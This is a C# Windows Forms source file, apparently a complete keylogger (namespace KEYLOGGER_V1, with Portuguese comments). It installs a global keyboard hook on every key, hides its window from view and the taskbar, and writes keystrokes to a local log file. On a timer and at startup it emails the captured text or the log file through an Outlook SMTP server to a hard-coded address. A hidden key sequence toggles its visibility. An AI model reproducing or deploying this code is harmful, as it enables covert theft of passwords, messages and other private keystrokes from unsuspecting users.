using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Mail;
using System.Diagnostics;

namespace KEYLOGGER_V1
{
    public partial class FrmHome : Form
    {
        int conta;
        string[] names = new string[3];
        
        
        globalKeyboardHook gkh = new globalKeyboardHook(); //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN
        private void HookAll()
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            txtTextoDigitado.Text += GerenciamentoDeCaracteres(Convert.ToString(e.KeyCode));
        }



        public FrmHome()//METODO CONSTRUTOR.
        {
            InitializeComponent();
        }
     
        private void FrmHome_Load(object sender, EventArgs e)//EVENTO: Inicialização do formulário, para verificações Iniciais.
        {   
            invisivel();                   //Torna o formulário INVISIVEL
            MetodosDeEventosHook();        //Ativa os eventos do teclado.
          
            if (Verifica_backup() == true)     //Comparação de existencia do Log
            {
                if (Habilitar_web() == true)   //Verificação de Conexão.
                {  
                    EnviarEmailBackup(@"C:\Key\Keylogger.txt"); //Envia o log por EMAIL.
                }

            }

        }
        void invisivel()//METODO: Deixa o formulário invisivel.
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;

        }

        public void visivel()//METODO: Deixa o formulário visivel.
        {
            this.Opacity = 100;
            this.ShowInTaskbar = true;
        }

        void MetodosDeEventosHook()
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            HookAll();
        }
        bool Verifica_backup()//METODO: Verifica se diretorio do LOG existe.
        {

            if (File.Exists(@"C:\Key\Keylogger.txt"))
            {
                return true;
            }
            else
            {
                return false;
            }

        }

        private void tmEnviarEmail_Tick(object sender, EventArgs e)//EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
        {
            BackupOrEmail(); 
        }

        [DllImport("wininet.dll")]                                                                       //Utilizado para a Confirmação da conexão. 
        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue); //Utilizado para a Confirmação da conexão.
        bool Habilitar_web()//METODO: Verifica que se a conexão, e retorna [TRUE] 
        {
            bool result;

            try
            {

                int Description;

                result = InternetGetConnectedState(out Description, 0);

            }

            catch
            {
               
                result = false;

            }

            return result;
        }
        void EnviarEmail(String Texto)//METODO: Email com as teclas digitadas. 
        {

            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));// ENVIE PERGUNTAS NESSE EMAIL ;)
            Email.From = (new MailAddress("OrionOficial@outlook.com")); // <--------------------------
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Body = Texto;
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("SeuEmailAqui@outlook.com", "SUA SENHA");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
                                                                               // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }
            //MessageBox.Show("Email enviado com sucesso!!", "Email - Enviado!");
            txtTextoDigitado.Clear();

        }
        void EnviarEmailBackup(String DirBackup)//METODO: Envia email com o log como anexo. 
        {
            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));  // ENVIE PERGUNTAS NESSE EMAIL ;)
            Email.From = (new MailAddress("OrionOficial@outlook.com")); // <--------------------------
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Attachments.Add(new Attachment(DirBackup));
            
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("SeuEmailAqui@outlook.com", "SUA SENHA");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
                                                                                                                // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }

        }

        void criarBackup(String DirBackup)//METODO: Cria o (backup /log) das teclas digitadas.
        {

            StreamWriter SW = new StreamWriter(DirBackup, true);
            SW.Write(txtTextoDigitado.Text);
            SW.Close();
            txtTextoDigitado.Clear();
        }
        void BackupOrEmail()//METODO: Verifica a conexão , se estiver conectado a internet ele envia por EMAIL.
        {

            if (Habilitar_web() == true)
            {
                if (txtTextoDigitado.Text != "")
                {
                    EnviarEmail(txtTextoDigitado.Text); //Envia email.
                }


            }
            else
            {
                if (txtTextoDigitado.Text != "")
                {
                   criarBackup(@"C:\Key\Keylogger.txt"); //Cria Backup.
                }
            }
        }

        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
        {
            File.Delete(@"C:\Key\Keylogger.txt"); //Deleta o (arquivo / Log) anterior.
            if (txtTextoDigitado.Text != "")      //Compara se foi digitado teclas.
            {
                criarBackup(@"C:\Key\Keylogger.txt"); //Salva um novo backup.
            }
            
        }

        String GerenciamentoDeCaracteres(String Key)//METODO: Mapeamento de teclas, e Comparação das teclas para substituição.
        {

            switch (Key)
            {

                case "LWin":
                    return "[Win]";
                case "LControlKey":
                    return "[Ctrl]";
                case "RControlKey":
                    return "[Ctrl]";
                case "LMenu":
                    return "[Alt]";
                case "RMenu":
                    return "[Alt]";
                case "Return":
                    return "[Enter]";
                case "Space":
                    return "[Space]";
                case "LShiftKey":
                    return "[Shift]";
                case "RShiftKey":
                    return "[Shift]";
                case "Capital":
                    return "[Caps Lock]";
                case "Tab":
                    return "[Tab]";
                case "Oemtilde":
                    return "'";
                case "Escape":
                    return "[Esc]";
                case "Back":
                    return "[Back]";
                case "PrintScreen":
                    return "[Print Screen]";
                case "Pause":
                    return "[Pause Break]";
                case "Insert":
                    return "[Insert]";
                case "Delete":
                    return "[Delete]";
                case "Home":
                    return "[Home]";
                case "PageUp":
                    return "[Page Up]";
                case "Next":
                    return "[Page Down]";
                case "End":
                    return "[End]";
                case "Apps":
                    return "[Menu]";
                case "Up":
                    return "[Up]";
                case "Down":
                    return "[Down]";
                case "Right":
                    return "[Right]";
                case "Left":
                    return "[Left]";
                case "Oemplus":
                    return "=";
                case "OemMinus":
                    return "-";
                case "Oem6":
                    return "[";
                case "Oem5":
                    return "]";
                case "Oem7":
                    return "";
                case "OemOpenBrackets":
                    return "´";
                case "Oem1":
                    return "Ç";
                case "Oemcomma":
                    return ",";
                case "OemPeriod":
                    return ".";
                case "OemQuestion":
                    return ";";
                case "D1":
                    return "1";
                case "D2":
                    return "2";
                case "D3":
                    return "3";
                case "D4":
                    return "4";
                case "D5":
                    return "5";
                case "D6":
                    return "6";
                case "D7":
                    return "7";
                case "D8":
                    return "8";
                case "D9":
                    return "9";
                case "D0":
                    return "0";
                case "F1":
                    return "[F1]";
                case "F2":
                    return "[F2]";
                case "F3":
                    return "[F3]";
                case "F4":
                    return "[F4]";
                case "F5":
                    return "[F5]";
                case "F6":
                    return "[F6]";
                case "F7":
                    return "[F7]";
                case "F8":
                    return "[F8]";
                case "F9":
                    return "[F9]";
                case "F10":
                    return "[F10]";
                case "F11":
                    return "[F11]";
                case "F12":
                    return "[F12]";
                default:

                    return Key;
            }


        }

        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)//EVENTO: quando ouver uma alteração no texto, irá ser verificado as teclas.
        {
            String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento

            if (teclaDeVisibilidade(txtTextoDigitado.Text, caracter) == caracter) // Comparação das teclas. simulação das teclas de atalho 
            {
                if (this.Opacity == 0 && this.ShowInTaskbar == false)             // Verifica se o formulario já esta invisivel
                {
                    visivel();

                }
                else {                                                            
                    
                    invisivel(); 
                                                  
                }
            }
        }

        String teclaDeVisibilidade(String texto, String caracter) //METODO: Pega a quantidade de caracteres necessario "[Ctrl][Delete][Esc]"
        {

            int contCarac = caracter.Length;
            int contText = texto.Length;

            if (contText >= contCarac)
            {
                int result = contText - contCarac;
                String caracteres = texto.Substring(result, contCarac);
                return caracteres;
            }
            else
            {
                return texto;
            }
            

        }

    }
}
